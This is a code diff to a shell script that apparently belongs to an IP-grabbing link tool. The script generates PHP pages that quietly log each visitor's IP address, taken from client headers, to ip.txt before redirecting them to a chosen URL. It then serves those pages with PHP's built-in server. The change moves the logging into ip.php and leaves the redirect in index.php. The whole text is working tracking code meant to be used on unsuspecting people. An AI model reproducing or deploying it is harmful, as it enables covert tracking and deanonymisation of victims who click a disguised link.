@@ -48,7 +48,8 @@ ini_cloud(){
 make_php(){
     url=$1
 
-    cat <<EOF > index.php
+if [[ ! -e "ip.php" ]]; then
+    cat <<EOF > ip.php
     <?php
     if (isset(\$_SERVER['HTTP_CLIENT_IP'])) {
         \$ip_address = \$_SERVER['HTTP_CLIENT_IP'];
@@ -62,16 +63,20 @@ make_php(){
         \$ip_address = \$_SERVER['REMOTE_ADDR'];
     }
 
-    header("Location: $url");
-
     \$file = fopen("ip.txt", "a");
     fwrite(\$file, "IP: " . \$ip_address);
     fclose(\$file);
     
+    ?>
+EOF
+fi
+
+    cat <<EOF > index.php
+    <?php
+    header("Location: $url");
     exit();
     ?>
 EOF
-
 php -S "$host":"$port" > /dev/null 2>&1 &
 }
 
